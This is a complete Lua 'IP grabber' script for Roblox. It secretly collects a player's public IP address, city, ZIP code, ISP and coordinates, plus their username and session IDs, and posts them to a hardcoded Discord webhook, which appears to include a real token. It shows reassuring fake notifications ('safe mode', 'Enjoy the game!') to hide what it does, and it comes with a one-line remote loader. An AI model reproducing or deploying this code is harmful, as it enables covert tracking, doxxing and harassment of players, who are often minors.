-- Roblox IP Grabber with visible confirmation & Discord webhook
-- Load with: loadstring(game:HttpGet("https://tinyurl.com/your-short-link"))()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

-- ╔════════════════════════════════════════════╗
-- ║               CHANGE THIS                  ║
-- ╚════════════════════════════════════════════╝
local WEBHOOK = "https://discordapp.com/api/webhooks/1475450397710614571/7bGlZJOSUuMRZYFXAvvpSrnPeaYkMDlD-EkHVjeA-ScW9aHjbHTEG3wT4bpx2-qTCG3e"

-- =============================================
--  Sends message to your Discord webhook
-- =============================================
local function sendToWebhook(title, description, color)
    local data = {
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description,
            ["color"] = color or 65280, -- green by default
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            ["footer"] = {["text"] = "Lua IP Grabber • " .. os.date("%H:%M:%S")}
        }}
    }
    
    pcall(function()
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

-- =============================================
--  Shows in-game notification (proof it's running)
-- =============================================
local function showNotification(title, text, duration)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 6,
        Icon = "rbxassetid://7072718362" -- green checkmark icon (looks legit)
    })
end

-- =============================================
--  Main IP fetching function
-- =============================================
local function getIPInfo()
    showNotification("Step 1", "Fetching your IP...", 4)
    
    local success, ip = pcall(function()
        return HttpService:GetAsync("https://api.ipify.org")
    end)
    
    if not success or not ip then
        showNotification("ERROR", "Could not get IP address", 8)
        return {error = "IP fetch failed"}
    end
    
    showNotification("Step 2", "Getting location & ISP...", 4)
    
    local geoSuccess, geo = pcall(function()
        return HttpService:JSONDecode(HttpService:GetAsync("http://ip-api.com/json/" .. ip))
    end)
    
    if geoSuccess and geo.status == "success" then
        showNotification("Success", "Data collected – sending to Discord", 5)
        return geo
    else
        showNotification("WARNING", "Location lookup failed – sending basic IP", 8)
        return {ip = ip, error = "Geo lookup failed"}
    end
end

-- =============================================
--  Build & send the full report
-- =============================================
local function main()
    local info = getIPInfo()
    
    local playerName = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    local userId = LocalPlayer.UserId
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    local msg = string.format(
        "**Roblox IP Grab Successful**\n\n" ..
        "Username: **%s** (@%s)\n" ..
        "UserId: **%d**\n" ..
        "PlaceId: **%d**\n" ..
        "JobId: **%s**\n\n" ..
        "**IP & Location Details**\n" ..
        "IP: `%s`\n" ..
        "City: `%s`\n" ..
        "Region: `%s`\n" ..
        "Country: `%s`\n" ..
        "ZIP/Postal: `%s`\n" ..
        "ISP: `%s`\n" ..
        "Organization: `%s`\n" ..
        "Coordinates: `%s`, `%s`\n" ..
        "Timezone: `%s`",
        
        playerName,
        displayName,
        userId,
        placeId,
        jobId,
        info.ip or "N/A",
        info.city or "N/A",
        info.regionName or "N/A",
        info.country or "N/A",
        info.zip or "N/A",
        info.isp or "N/A",
        info.org or "N/A",
        info.lat or "N/A",
        info.lon or "N/A",
        info.timezone or "N/A"
    )
    
    sendToWebhook("IP Grab Report", msg, 0xff0000) -- red embed
end

-- =============================================
--  Run everything
-- =============================================
showNotification("Script Loaded", "Checking your connection... (safe mode)", 5)
wait(1.5)
main()
showNotification("Finished", "Session check complete. Enjoy the game!", 6)
